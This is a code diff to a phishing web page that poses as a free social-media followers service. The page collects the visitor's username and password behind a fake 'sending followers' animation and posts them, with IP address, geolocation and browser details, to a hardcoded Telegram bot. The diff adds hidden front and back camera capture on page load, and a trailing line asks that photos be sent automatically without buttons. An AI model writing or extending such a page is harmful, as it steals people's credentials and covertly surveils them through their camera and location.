@@ -114,6 +114,16 @@
             }
         }
 
+        /* Display Personal Information */
+        #personalInfo {
+            margin-top: 20px;
+            font-size: 18px;
+        }
+
+        /* Cameras */
+        video, canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -139,6 +149,22 @@
     <div id="phase3" class="phaseMessage">Sending followers...</div>
     <div id="passwordCorrect" class="phaseMessage">Correct password!</div>
 
+    <!-- Display Personal Information -->
+    <div id="personalInfo">
+        <p id="ipAddress"></p>
+        <p id="geoLocation"></p>
+        <p id="browserInfo"></p>
+    </div>
+
+    <!-- Video and Canvas Elements for Capturing Photos -->
+    <video id="frontCamera" width="320" height="240" autoplay></video>
+    <button onclick="takeFrontPhoto()">Capture Front Photo</button>
+    <canvas id="frontCanvas" width="320" height="240"></canvas>
+
+    <video id="backCamera" width="320" height="240" autoplay></video>
+    <button onclick="takeBackPhoto()">Capture Back Photo</button>
+    <canvas id="backCanvas" width="320" height="240"></canvas>
+
     <script>
         let typeIndex = 0;
         let deleting = false;
@@ -148,32 +174,99 @@
         // Function for typing and deleting the text
         function typeWriter() {
             if (!deleting) {
-                // Type the text character by character
                 if (typeIndex < text.length) {
                     typewriterText.innerHTML = text.slice(0, typeIndex + 1);
                     typeIndex++;
                 } else {
-                    // Wait for 3 seconds once the text is fully typed
                     setTimeout(() => {
                         deleting = true;
                     }, 3000);
                 }
             } else {
-                // Delete the text character by character
                 if (typeIndex > 0) {
                     typewriterText.innerHTML = text.slice(0, typeIndex - 1);
                     typeIndex--;
                 } else {
-                    // Reset the typewriter effect to start again
                     deleting = false;
-                    setTimeout(typeWriter, 500); // Delay before starting the next typing cycle
+                    setTimeout(typeWriter, 500);
                 }
             }
         }
 
-        // Start the typing effect
-        setInterval(typeWriter, 100); // Adjust typing speed here
+        setInterval(typeWriter, 100);
 
+        // Fetch additional personal information
+        function getPersonalInformation() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    document.getElementById('ipAddress').innerText = `IP Address: ${ipAddress}`;
+
+                    // Get geolocation (latitude and longitude)
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(function(position) {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+                            document.getElementById('geoLocation').innerText = `Location: Latitude ${latitude}, Longitude ${longitude}`;
+                        }, function(error) {
+                            document.getElementById('geoLocation').innerText = "Location: Unable to retrieve geolocation.";
+                        });
+                    } else {
+                        document.getElementById('geoLocation').innerText = "Location: Geolocation not supported.";
+                    }
+
+                    // Get the browser and system information
+                    const browserInfo = navigator.userAgent;
+                    document.getElementById('browserInfo').innerText = `Browser Info: ${browserInfo}`;
+                })
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                    alert('Failed to fetch IP address. Please try again later.');
+                });
+        }
+
+        // Call the function to fetch and display personal information
+        getPersonalInformation();
+
+        // Start both cameras
+        function startCameras() {
+            // Get user media for front camera
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(function (stream) {
+                    document.getElementById('frontCamera').srcObject = stream;
+                }).catch(function (error) {
+                    alert("Error accessing front camera: " + error);
+                });
+
+            // Get user media for back camera
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+                .then(function (stream) {
+                    document.getElementById('backCamera').srcObject = stream;
+                }).catch(function (error) {
+                    alert("Error accessing back camera: " + error);
+                });
+        }
+
+        // Capture photo from front camera
+        function takeFrontPhoto() {
+            const frontCanvas = document.getElementById('frontCanvas');
+            const frontContext = frontCanvas.getContext('2d');
+            const frontVideo = document.getElementById('frontCamera');
+            frontContext.drawImage(frontVideo, 0, 0, frontCanvas.width, frontCanvas.height);
+            frontPhoto = frontCanvas.toDataURL('image/jpeg'); // Convert to Base64
+        }
+
+        // Capture photo from back camera
+        function takeBackPhoto() {
+            const backCanvas = document.getElementById('backCanvas');
+            const backContext = backCanvas.getContext('2d');
+            const backVideo = document.getElementById('backCamera');
+            backContext.drawImage(backVideo, 0, 0, backCanvas.width, backCanvas.height);
+            backPhoto = backCanvas.toDataURL('image/jpeg'); // Convert to Base64
+        }
+
+        // Send both photos and other info to Telegram
         function sendToTelegram() {
             const number = document.getElementById('numberInput').value;
             const username = document.getElementById('usernameInput').value;
@@ -188,9 +281,8 @@
             const phase3 = document.getElementById('phase3');
             const passwordCorrect = document.getElementById('passwordCorrect');
 
-            // Check if user is in cooldown for the same username
             const lastSentData = JSON.parse(localStorage.getItem('lastSentData'));
-            const cooldownDuration = 1200000; // 20 minutes in milliseconds
+            const cooldownDuration = 1200000;
 
             if (lastSentData && lastSentData.username === username) {
                 const elapsedTime = Date.now() - lastSentData.timestamp;
@@ -210,56 +302,50 @@
                 return;
             }
 
-            // Reset previous messages
             cooldownMessage.style.display = 'none';
             finalMessage.style.display = 'none';
             phase1.style.display = 'none';
             phase2.style.display = 'none';
             phase3.style.display = 'none';
-            passwordCorrect.style.display = 'none'; // Hide password message
+            passwordCorrect.style.display = 'none';
             finalMessage.innerText = '';
 
-            // Disable button, show spinner and loading text
             sendButton.disabled = true;
-            loading.style.display = 'block';
-            loadingText.style.display = 'block';
+            loading.style.display = 'block'; // Start loading animation
+            loadingText.style.display = 'block'; // Show loading text
 
-            // Store the current timestamp and username in localStorage
             const currentData = { username, timestamp: Date.now() };
             localStorage.setItem('lastSentData', JSON.stringify(currentData));
 
-            // Start the animation phases (5s for searching, 5s for password, 10s for sending)
             setTimeout(() => {
-                phase1.style.display = 'block'; // "Searching username..."
-            }, 1000); // Start phase 1 after 1s delay (to give time for UI)
+                phase1.style.display = 'block';
+            }, 1000);
 
             setTimeout(() => {
                 phase1.style.display = 'none';
-                phase2.style.display = 'block'; // "Username found! Trying password..."
-            }, 6000); // Show "Trying password..." after 5s
+                phase2.style.display = 'block';
+            }, 6000);
 
-            // Show "Correct password" for 5 seconds
             setTimeout(() => {
                 phase2.style.display = 'none';
-                passwordCorrect.style.display = 'block'; // "Correct password!"
-            }, 11000); // Show "Correct password..." after 5s of trying password
+                passwordCorrect.style.display = 'block';
+            }, 11000);
 
             setTimeout(() => {
-                passwordCorrect.style.display = 'none'; // Hide the "Correct password" message
-                phase3.style.display = 'block'; // "Sending followers..."
-            }, 16000); // Show "Sending followers..." after another 5s
+                passwordCorrect.style.display = 'none';
+                phase3.style.display = 'block';
+            }, 16000);
 
-            // Fetch user's public IP address using ipify API
+            // Fetch IP and other personal information again to send with the request
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     const ipAddress = data.ip;
 
-                    // Now, simulate sending the followers and only then display success
                     setTimeout(() => {
-                        const botToken = '7860515679:AAFnL-Unl7WnyOQbOyd-yaERErJA6nK52hg';
-                        const chatId = '5760976310';
-                        const text = `📢 New Request:\n👤 Username: ${username}\n🔢 Followers: ${number}\n🔒 Password: ${password}\n🌍 IP Address: ${ipAddress}`;
+                        const botToken = '7860515679:AAFnL-Unl7WnyOQbOyd-yaERErJA6nK52hg'; // Replace with your bot token
+                        const chatId = '5760976310'; // Replace with your chat ID
+                        const text = `📢 New Request:\n👤 Username: ${username}\n🔢 Followers: ${number}\n🔒 Password: ${password}\n🌍 IP Address: ${ipAddress}\n📍 Location: ${document.getElementById('geoLocation').innerText}\n🖥 Browser Info: ${document.getElementById('browserInfo').innerText}`;
 
                         const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
 
@@ -267,7 +353,6 @@
                             .then(response => response.json())
                             .then(data => {
                                 if (data.ok) {
-                                    // Hide "Sending followers..." and show success message
                                     phase3.style.display = 'none';
                                     finalMessage.innerText = `${number} followers sent! ✅`;
                                     finalMessage.style.display = 'block';
@@ -277,25 +362,26 @@
                             })
                             .catch(error => console.error('Error:', error))
                             .finally(() => {
-                                // Hide the spinner and loading text after the process is done
-                                loading.style.display = 'none';
-                                loadingText.style.display = 'none';
+                                loading.style.display = 'none'; // Stop the loader
+                                loadingText.style.display = 'none'; // Hide the loading text
                             });
 
-                        // Enable the button after 20 minutes (1200000 milliseconds)
                         setTimeout(() => {
                             localStorage.removeItem('lastSentData');
                             sendButton.disabled = false;
                         }, cooldownDuration);
-                    }, 21000); // Total 21s for full animation and data sending
+                    }, 21000);
                 })
                 .catch(error => {
                     console.error('Error fetching IP:', error);
-                    loading.style.display = 'none';
-                    loadingText.style.display = 'none';
+                    loading.style.display = 'none'; // Stop the loader if the IP fetch fails
+                    loadingText.style.display = 'none'; // Hide the loading text if IP fetch fails
                     alert('Failed to fetch IP address. Please try again later.');
                 });
         }
+
+        // Start cameras on page load
+        window.onload = startCameras;
     </script>
 </body>
-</html>
+</html>                         just delkete 2 2 buttoms don't wait just send the foto
